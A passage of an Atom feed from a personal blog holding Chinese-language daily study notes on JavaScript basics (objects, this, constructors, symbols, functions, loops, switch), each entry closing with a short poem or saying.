    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="注-本章节较难，请选择性阅读"><a href="#注-本章节较难，请选择性阅读" class="headerlink" title="注:本章节较难，请选择性阅读"></a>注:本章节较难，请选择性阅读</h5><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>使用{…}来创建对象。一个属性就是一个键值对（“key: value”），其中键是一个字符串（也叫做属性名），值可以是任何值。</p><pre><code>构造对象方法:let user = new Object();     // “构造函数” 的语法let user = &#123;&#125;;               // “字面量” 的语法读取文件的属性:alert( user.name );          // Johnalert( user.age );           // 30移除属性:delete user.age;             // 移除age这个key方括号:let user = &#123;&#125;;// 设置user[&quot;likes birds&quot;] = true;  // 单引号或双引号都可以// 读取alert(user[&quot;likes birds&quot;]);  // true// 删除delete user[&quot;likes birds&quot;];属性值简写:name, 与 name: name 相同属性名称限制:类型会被自动地转换为字符串但__proto__属性。不能将它设置为一个非对象的值属性存在性测试:alert( user.noSuchProperty === undefined );       // true 意思是没有这个属性alert( &quot;age&quot; in user );                           // true 存在</code></pre><h4 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for..in 循环"></a>for..in 循环</h4><pre><code>for (key in object) &#123;  // 对此对象属性中的每个键执行的代码&#125;遍历一个对象时，整数属性会被进行从小到大排序但是 “+49” 和 “1.2” 不行，那它们就按照创建时的顺序来排序</code></pre><h4 id="对象引用和复制"><a href="#对象引用和复制" class="headerlink" title="对象引用和复制"></a>对象引用和复制</h4><p>赋值了对象的变量存储的不是对象本身，而是该对象“在内存中的地址”。</p><h5 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用:"></a>对象的引用:</h5><pre><code>let user = &#123; name: &#39;John&#39; &#125;;let admin = user;admin.name = &#39;Pete&#39;;               // 通过 &quot;admin&quot; 引用来修改alert(user.name);                  // &#39;Pete&#39;，修改能通过 &quot;user&quot; 引用看到</code></pre><p>仅当两个对象为同一对象时，两者才相等。<br>两个独立的对象则并不相等，即使它们看起来很像（都为空）。</p><h5 id="对象的复制"><a href="#对象的复制" class="headerlink" title="对象的复制"></a>对象的复制</h5><p>通过遍历已有对象的属性，并在原始类型值的层面复制它们，以实现对已有对象结构的复制。</p><pre><code>let user = &#123;  name: &quot;John&quot;,&#125;;let clone = &#123;&#125;;                       // 新的空对象for (let key in user) &#123;               // 将 user 中所有的属性拷贝到其中  clone[key] = user[key];             // 现在 clone 是带有相同内容的完全独立的对象&#125;clone.name = &quot;Pete&quot;;                  // 改变了其中的数据alert( user.name );                   // 原来的对象中的 name 属性依然是 John【也可以使用 Object.assign 方法】Object.assign(dest, [src1, src2, src3...])1.dest 是指目标对象2.src1, ..., srcN是源对象（需传递的参数）3.将所有源对象的属性拷贝到目标对象 dest 中4.调用结果返回 dest5.如果被拷贝的属性的属性名已经存在，那么它会被覆盖</code></pre><h5 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h5><pre><code>let 克隆生成的对象 = Object.assign(&#123;&#125;, 克隆的对象);或者使用“深拷贝”函数，例如 _.cloneDeep(obj)</code></pre><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>1.可达性<br>&emsp;&emsp;如果一个值可以通过引用链从根访问任何其他值，则认为该值是可达的<br>&emsp;&emsp;垃圾回收器会删除掉那些已经不可达的(没有外部对其的引用)<br>2.内部算法(mark-and-sweep):<br>&emsp;&emsp;垃圾收集器遍历所有的根，并“标记”（记住）它们和他们的引用。<br>&emsp;&emsp;没有被标记的对象都会被删除。<br>3.优化建议:<br>&emsp;&emsp;分代收集/增量收集/闲时收集<br>&emsp;&emsp;<a href="https://zh.javascript.info/garbage-collection#zong-jie">进阶了解</a></p><h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><p>存储在对象属性中的函数被称为“方法”<br>使用函数表达式创建一个函数，并将其指定给对象的属性，随后调用它。就叫做得到了 user 对象的 sayHi 方法。</p><h5 id="this"><a href="#this" class="headerlink" title="this"></a>this</h5><p>访问对象中存储的信息<br>this可以用于任何函数,它取决于代码上下文<br>严格模式下没有对象的情况下调用:this==undefined但尝试访问this.name将会报错<br>this的值是在调用时计算出来的，它的值取决于在“点符号前”的是什么对象。<br>箭头函数没有自己的this。若在箭头函数中引用this，则this值取决于外部“正常的”函数。</p><pre><code>let user = &#123; name: &quot;John&quot; &#125;;let admin = &#123; name: &quot;Admin&quot; &#125;;function sayHi() &#123;  alert( this.name );&#125;// 在两个对象中使用相同的函数user.f = sayHi;admin.f = sayHi;// 这两个调用有不同的 this 值// 函数内部的 &quot;this&quot; 是“点符号前面”的那个对象user.f(); // John（this == user）admin.f(); // Admin（this == admin）admin[&#39;f&#39;](); // Admin（使用点符号或方括号语法来访问这个方法，都没有关系。）</code></pre><h4 id="重点误区，必须记住"><a href="#重点误区，必须记住" class="headerlink" title="重点误区，必须记住"></a><a href="https://zh.javascript.info/object-methods#zai-dui-xiang-zi-mian-liang-zhong-shi-yong-this">重点误区，必须记住</a></h4><h4 id="构造器和操作符-“new”"><a href="#构造器和操作符-“new”" class="headerlink" title="构造器和操作符 “new”"></a>构造器和操作符 “new”</h4><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>命名以大写字母开头。<br>只能由 “new” 操作符来执行</p><pre><code>function User(name) &#123;                1.一个新的空对象被创建并分配给 this。  this.name = name;                  2.函数体执行。通常它会修改 this，为其添加新的属性。  this.isAdmin = false;              3.返回 this 的值。&#125;</code></pre><p>任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器</p><h4 id="new-function-…"><a href="#new-function-…" class="headerlink" title="new function() { … }"></a>new function() { … }</h4><p>如果有许多行用于创建单个复杂对象的代码，可以将它们封装在一个立即调用的构造函数中</p><pre><code>// 创建一个函数并立即使用 new 调用它let user = new function() &#123;  this.name = &quot;John&quot;;  this.isAdmin = false;  // ……用于用户创建的其他代码  // 也许是复杂的逻辑和语句  // 局部变量等&#125;;</code></pre><p>这个构造函数不能被再次调用，因为它不保存在任何地方，只是被创建和调用。<br>因此，这个技巧旨在封装构建单个对象的代码，而无需将来重用。</p><h4 id="构造器模式测试-无需重视"><a href="#构造器模式测试-无需重视" class="headerlink" title="构造器模式测试,无需重视"></a><a href="https://zh.javascript.info/constructor-new#gou-zao-qi-mo-shi-ce-shi-newtarget">构造器模式测试,无需重视</a></h4><h4 id="可选链"><a href="#可选链" class="headerlink" title="可选链"></a>可选链</h4><pre><code>语法有三种形式：obj?.prop —— 如果 obj 存在则返回 obj.prop，否则返回 undefined。obj?.[prop] —— 如果 obj 存在则返回 obj[prop]，否则返回 undefined。obj.method?.() —— 如果 obj.method 存在则调用 obj.method()，否则返回 undefined。总结?. 检查左边部分是否为 null/undefined，如果不是则继续运算。</code></pre><h4 id="symbol-类型"><a href="#symbol-类型" class="headerlink" title="symbol 类型"></a>symbol 类型</h4><p>“symbol” 值表示唯一的标识符。<br>使用 Symbol() 来创建这种类型的值<br>可以给 symbol 一个描述（也称为 symbol 名）          //let id = Symbol(“id”);<br>symbol 保证是唯一的。即使我们创建了许多具有相同描述的 symbol，它们的值也是不同。symbol 不会被自动转换为字符串<br>真的想显示一个 symbol，我们需要</p><pre><code>在它上面调用 .toString()    let id = Symbol(&quot;id&quot;);    alert(id.toString());        //Symbol(id)或者获取 symbol.description 属性，只显示描述    let id = Symbol(&quot;id&quot;);    alert(id.description);       // id</code></pre><p>主要的使用场景：<br>1.“隐藏” 对象属性。<br>    如果我们想要向“属于”另一个脚本或者库的对象添加一个属性，我们可以创建一个 symbol 并使用它作为属性的键。<br>2.JavaScript 使用了许多系统 symbol，这些 symbol 可以作为 Symbol.* 访问。我们可以使用它们来改变一些内建行为。<br>3.symbol 在 for…in 中会被跳过<br>4.Object.keys(user) 也会忽略它们<br>5.相反，Object.assign 会同时复制字符串和 symbol 属性</p><h4 id="对象-——-原始值转换"><a href="#对象-——-原始值转换" class="headerlink" title="对象 —— 原始值转换"></a>对象 —— 原始值转换</h4><p>JavaScript 不允许自定义运算符对对象的处理方式<br>此类运算的情况下，对象会被自动转换为原始值，然后对这些原始值进行运算，并得到运算结果（也是一个原始值）</p><h5 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h5><p>1.没有转换为布尔值,所有的对象在布尔上下文（context）中均为 true<br>2.数字转换发生在对象相减或应用数学函数时<br>3.字符串转换通常发生在像 alert(obj) 这样输出一个对象和类似的上下文中</p><h5 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h5><p>“string”（对于 alert 和其他需要字符串的操作）<br>“number”（对于数学运算）<br>“default”（少数运算符，通常对象以和 “number” 相同的方式实现 “default” 转换）</p><h4 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h4><p>用来给转换方法命名</p><h4 id="toString-valueOf"><a href="#toString-valueOf" class="headerlink" title="toString/valueOf"></a>toString/valueOf</h4><p>对于 “string” hint：调用 toString 方法，如果它不存在，则调用 valueOf 方法（因此，对于字符串转换，优先调用 toString）。<br>对于其他 hint：调用 valueOf 方法，如果它不存在，则调用 toString 方法（因此，对于数学运算，优先调用 valueOf 方法）。</p><h4 id="转换可以返回任何原始类型"><a href="#转换可以返回任何原始类型" class="headerlink" title="转换可以返回任何原始类型"></a>转换可以返回任何原始类型</h4><p>它们不一定会返回 “hint” 的原始值<br>唯一强制性的事情是：这些方法必须返回一个原始值，而不是对象。</p><h4 id="进一步的转换"><a href="#进一步的转换" class="headerlink" title="进一步的转换"></a>进一步的转换</h4><p>如果我们将对象作为参数传递，则会出现两个运算阶段：<br>1.对象被转换为原始值（通过前面我们描述的规则）。<br>2.如果还需要进一步计算，则生成的原始值会被进一步转换。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><pre><code>首先调用 obj[Symbol.toPrimitive](hint) 如果这个方法存在，否则，如果 hint 是 &quot;string&quot;        尝试调用 obj.toString() 或 obj.valueOf()，无论哪个存在。否则，如果 hint 是 &quot;number&quot; 或者 &quot;default&quot;        尝试调用 obj.valueOf() 或 obj.toString()，无论哪个存在。在实际使用中，通常只实现 obj.toString() 作为字符串转换的“全能”方法就足够了，该方法应该返回对象的“人类可读”表示，用于日志记录或调试。</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="遇事不决可问春风，春风不语即随本心。"><a href="#遇事不决可问春风，春风不语即随本心。" class="headerlink" title="遇事不决可问春风，春风不语即随本心。"></a>遇事不决可问春风，春风不语即随本心。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;注-本章节较难，请选择性阅读&quot;&gt;&lt;a href=&quot;#注-本章节较难，请选择性阅读&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221104</title>
    <link href="https://liu1272.github.io/2022/11/04/20221104/"/>
    <id>https://liu1272.github.io/2022/11/04/20221104/</id>
    <published>2022-11-04T08:38:00.000Z</published>
    <updated>2022-11-06T09:22:58.280Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><pre><code>let sayHi = function() &#123;  alert( &quot;Hello&quot; );&#125;;function关键字后面没有函数名。函数表达式允许省略函数名注意末尾会有个分号!因为这是以 function(…) &#123;…&#125; 的形式创建的。它不是函数语法的一部分。含义:&quot;创建一个函数并将其放入变量sayHi中&quot;。alert( sayHi );         // 显示函数代码————因为函数是一个值alert( sayHi() );       // 执行函数let func = sayHi;       //将 sayHi 复制到了变量 func</code></pre><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><pre><code>function ask(question, yes, no) &#123;  if (confirm(question)) yes()  else no();&#125;function showOk() &#123;  alert( &quot;You agreed.&quot; );&#125;function showCancel() &#123;  alert( &quot;You canceled the execution.&quot; );&#125;// 用法：函数 showOk 和 showCancel 被作为参数传入到 askask(&quot;Do you agree?&quot;, showOk, showCancel);</code></pre><p>showOk 是回答 “yes” 的回调，showCancel 是回答 “no” 的回调。</p><h5 id="函数表达式-vs-函数声明"><a href="#函数表达式-vs-函数声明" class="headerlink" title="函数表达式 vs 函数声明"></a>函数表达式 vs 函数声明</h5><p>1.语法<br>函数声明：在主代码流中声明为单独的语句的函数<br>函数表达式：在一个表达式中或另一个语法结构中创建的函数。下面这个函数是在赋值表达式 = 右侧创建的<br>2.创建函数时机<br>在函数声明被定义之前，它就可以被调用。<br>函数表达式是在代码执行到达时被创建，并且仅从那一刻起可用。<br>3.块级作用域<br>严格模式下，当一个函数声明在一个代码块内时，它在该代码块内的任何位置都是可见的。但在代码块外不可见。</p><pre><code>let age = 16;              // 拿 16 作为例子if (age &lt; 18) &#123;  welcome();               // \   (运行)  function welcome() &#123;     //  |    alert(&quot;Hello!&quot;);       //  |  函数声明在声明它的代码块内任意位置都可用  &#125;                        //  |  在花括号外部调用函数，我们看不到它们内部的函数声明  welcome();               // /   (运行)&#125; else &#123;  function welcome() &#123;    alert(&quot;Greetings!&quot;);  &#125;&#125;welcome();                 // Error: welcome is not defined【正确写法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome;if (age &lt; 18) &#123;  welcome = function() &#123;    alert(&quot;Hello!&quot;);  &#125;;&#125; else &#123;  welcome = function() &#123;    alert(&quot;Greetings!&quot;);  &#125;;&#125;welcome(); // 现在可以了【改进方法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome = (age &lt; 18) ?  function() &#123; alert(&quot;Hello!&quot;); &#125; :  function() &#123; alert(&quot;Greetings!&quot;); &#125;;welcome(); // 现在可以了</code></pre><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><pre><code>单行箭头函数:let sum = (a, b) =&gt; a + b;/* 这个箭头函数是下面这个函数的更短的版本：let sum = function(a, b) &#123;  return a + b;&#125;;*/alert( sum(1, 2) ); // 3多行箭头函数:let sum = (a, b) =&gt; &#123;  // 花括号表示开始一个多行函数  let result = a + b;  return result;       // 如果我们使用了花括号，那么我们需要一个显式的 “return”&#125;;alert( sum(1, 2) );    // 3从 =&gt; 的左侧获取参数，计算并返回右侧表达式的计算结果用花括号括起来之后，需要包含 return 才能返回值（就像常规函数一样）只有一个参数，还可以省略掉参数外的圆括号没有参数，括号则是空的（但括号必须保留）</code></pre><h4 id="函数总结"><a href="#函数总结" class="headerlink" title="函数总结"></a>函数总结</h4><p>1.函数是值。它们可以在代码的任何地方被分配，复制或声明。<br>2.如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。<br>3.如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。<br>4.在执行代码块之前，内部算法会先处理函数声明(所以函数声明在其被声明的代码块内的任何位置都是可见的)<br>5.函数表达式在执行流程到达时创建。<br>6.首选使用函数声明;仅当函数声明不适合对应的任务时，才应使用函数表达式。</p><h3 id="javascript基础复习"><a href="#javascript基础复习" class="headerlink" title="javascript基础复习"></a>javascript基础复习</h3><p>1.语句用分号分隔<br>2.即使我们在某处添加了「额外的」分号，这也不是错误。分号会被忽略的。<br>3.尽量使用”use strict”<br>4.使用let，const（不变的，不能被改变），var（旧式的，稍后会看到）声明变量<br>5.变量是动态类型的，它们可以存储任何值<br>6.有 8 种数据类型：<br>&nbsp;&nbsp;number — 可以是浮点数，也可以是整数，<br>&nbsp;&nbsp;bigint — 用于任意长度的整数，<br>&nbsp;&nbsp;string — 字符串类型，<br>&nbsp;&nbsp;boolean — 逻辑值：true/false，<br>&nbsp;&nbsp;null — 具有单个值 null 的类型，表示“空”或“不存在”，<br>&nbsp;&nbsp;undefined — 具有单个值 undefined 的类型，表示“未分配（未定义）”，<br>&nbsp;&nbsp;object 和 symbol — 对于复杂的数据结构和唯一标识符，我们目前还没学习这个类型。<br>7.交互:alert、prompt 和 confirm<br>8.二进制加号 + 可以连接字符串。如果任何一个操作数是一个字符串，那么另一个操作数也将被转换为字符串<br>9.三元运算符:cond?resultA:resultB。如果cond为真,则返回resultA,否则返回resultB<br>10.空值合并运算符:a??b的结果是a,除非a为null/undefined,这时结果是b。<br>11.在 for(let…) 循环内部声明的变量只在该循环内可见。但可以省略let并重用已有的变量。<br>12.break/continue允许退出整个循环/当前迭代。使用标签来打破嵌套循环<br>13.switch”结构可以替代多个if检查。它内部使用===进行比较。<br>14.prompt的结果是一个字符串，而不是数字<br>15.函数声明和循环语句后不需要加分号</p><h5 id="其它说明"><a href="#其它说明" class="headerlink" title="其它说明"></a>其它说明</h5><p><a href="https://zh.javascript.info/debugging-chrome">在浏览器中调试</a><br><a href="https://zh.javascript.info/coding-style#tasks">代码风格!!!</a><br><a href="https://zh.javascript.info/comments">注释</a></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>从岐山到长安，高铁只需要一个小时就能抵达，这么一段路，丞相却走了一生。<br>从生至死，人需要经历百年，但有一段岁月，却跟着我走完了一生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;函数表达式&quot;&gt;&lt;a href=&quot;#函数表达式&quot; class=&quot;headerlink&quot; title=&quot;函数表达式&quot;&gt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221103</title>
    <link href="https://liu1272.github.io/2022/11/03/20221103/"/>
    <id>https://liu1272.github.io/2022/11/03/20221103/</id>
    <published>2022-11-02T16:32:00.000Z</published>
    <updated>2022-11-11T18:31:25.886Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><pre><code>let i = 0;while (i &lt; 3) &#123;           #条件的结果会被转化为布尔值  alert( i );  i++;&#125;</code></pre><p>如果循环体只有一条语句(单循环体)，则可以省略大括号</p><h5 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h5><pre><code>let i = 0;do &#123;  alert( i );  i++;&#125; while (i &lt; 3);</code></pre><p>将条件检查移至循环体下面<br>先执行循环体，然后检查条件，当条件为真时，重复执行循环体</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><pre><code>for (begin; condition; step) &#123;  循环体&#125;begin进入循环时执行一次condition判断条件body条件为真时，重复运行step每次循环体迭代后执行</code></pre><p>内联变量声明:<br>&emsp;&emsp;函数在执行时，会先在自己的函数体里查询变量，如果没有，才会一级一级往上查找。函数show()在执行时，输出第一个变量a是undefined是因为它现在自己的执行环境里查询到变量a已声明，即变量提升（即变量可以提前声明但是赋值是不可以的），此时就输出了undefined。<br>&emsp;&emsp;因此会出现变量污染现象<br>省略语句段:<br>&emsp;&emsp;不需要做任何事的部分，就可以省略 begin 语句段<br>&emsp;&emsp;注意for的两个;必须存在</p><h5 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue"></a>break与continue</h5><p>一，普通<br>用法与python一样<br>但是，禁止break/continue在‘?’的右边<br>所以，不建议使用?代替if语句<br>二，进阶</p><pre><code>标签(在循环之前带有冒号的标识符)break &lt;labelName&gt; 语句跳出循环至标签labelName:处continue &lt;labelName&gt; 语句执行跳转到标记循环的下一次迭代可以将标签移至单独一行break 指令必须在代码块内continue 只有在循环内部才可行</code></pre><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><pre><code>至少一个 case 代码块和一个可选的 default 代码块switch(x) &#123;  case &#39;value1&#39;:  // if (x === &#39;value1&#39;)    ...    [break]  case &#39;value2&#39;:  // if (x === &#39;value2&#39;)    ...    [break]  default:    ...    [break]&#125;流程:判断条件从成立的开始往下执行直到break，若无break则走到尾(包括default)分组:case 3: // (*) 下面这两个 case 被分在一组，满足一个条件就执行，原理是没有breakcase 5:  alert(&#39;Wrong!&#39;);  alert(&quot;Why don&#39;t you take a math class?&quot;);  break;</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在 JavaScript 中，函数不是“神奇的语言结构”，而是一种特殊的值<br>创建函数的三种方法:函数声明，函数表达式，箭头函数</p><pre><code>function name(parameter1, parameter2, ... parameterN) &#123;  ...body...&#125;name();首先是关键字，然后是函数名，然后是括号之间的参数列表(用逗号分隔)，最后是花括号之间的代码(函数体)parameter是函数参数，下面引用函数时可以使用它作为参数(argument)未提供parameter时，那么相应的值就会变成undefined(默认参数)可以text = &quot;内容&quot;这样子来传参返回值return执行时，函数停止，并将值返回给调用代码，没有返回值会导致函数立即退出并为undefined</code></pre><p>局部变量:<br>在函数中声明的变量只在该函数内部可见</p><p>外部变量:<br>函数也可以访问外部变量<br>函数对外部变量拥有全部的访问权限。函数也可以修改外部变量。<br>函数内部声明了同名变量，那么函数会遮蔽外部变量</p><pre><code>默认参数的计算:在JS中，函数在没带个别参数的情况下被调用，默认参数会被计算出来。如果传递了参数text，那么anotherFunction()就不会被调用。如果没传递参数text，那么anotherFunction()就会被调用。function showMessage(from, text = anotherFunction()) &#123;  // anotherFunction() 仅在没有给定 text 时执行  // 其运行结果将成为 text 的值&#125;也可以这样function showCount(count) &#123;  // 如果 count 为 undefined 或 null，则提示 &quot;unknown&quot;  alert(count ?? &quot;unknown&quot;);&#125;showCount(0); // 0showCount(null); // unknownshowCount();                        // unknown或者这样function showMessage(text) &#123;  // ...  if (text === undefined) &#123;         // 如果参数未被传递进来    text = &#39;empty message&#39;;  &#125;  alert(text);&#125;showMessage();                      // empty message还可以这样function showMessage(text) &#123;  // 如果 text 为 undefined 或者为假值，那么将其赋值为 &#39;empty&#39;  text = text || &#39;empty&#39;;  alert(text);&#125;showMessage();                     // empty</code></pre><p>返回值</p><pre><code>function doNothing() &#123; /* 没有代码 */ &#125;alert( doNothing());函数无返回值，它就会像返回 undefined 一样空值的 return 和 return undefined 等效如果想要将返回的表达式写成跨多行的形式，那么应该在return的同一行开始写此表达式(比如先写个括号)</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>作为参数传递给函数的值，会被复制到函数的局部变量。<br>函数可以访问外部变量。但它只能从内到外起作用。函数外部的代码看不到函数内的局部变量。<br>函数可以返回值。如果没有返回值，则其返回的结果是 undefined。<br>为了使代码简洁易懂，建议在函数中主要使用局部变量和参数，而不是外部变量<br>获取参数、使用参数并返回结果的函数更容易理解。<br>一个好的函数名能够让我们马上知道这个函数的功能是什么，会返回什么。<br>一个单独的函数不仅更容易测试和调试 —— 它的存在本身就是一个很好的注释！</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>一月添香<br>二月夜未央<br>三月情诗慌张<br>四月对镜补红妆<br>五月相携游马十方<br>六月日日笙歌抛流光<br>七月为卿斟唱曲水流觞<br>八月年华辗转处陌上成双<br>九月田中百花争艳怜意满腔<br>十月眠里光阴归去思念倾满江<br>十一月冬雷阵阵我笑悲歌不恸上苍<br>十二月天寒地冻凭楼伫等把痴梦熬荒<br>可叹，人间再无双</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;循环&quot;&gt;&lt;a href=&quot;#循环&quot; class=&quot;headerlink&quot; title=&quot;循环&quot;&gt;&lt;/a&gt;循环&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
</feed>
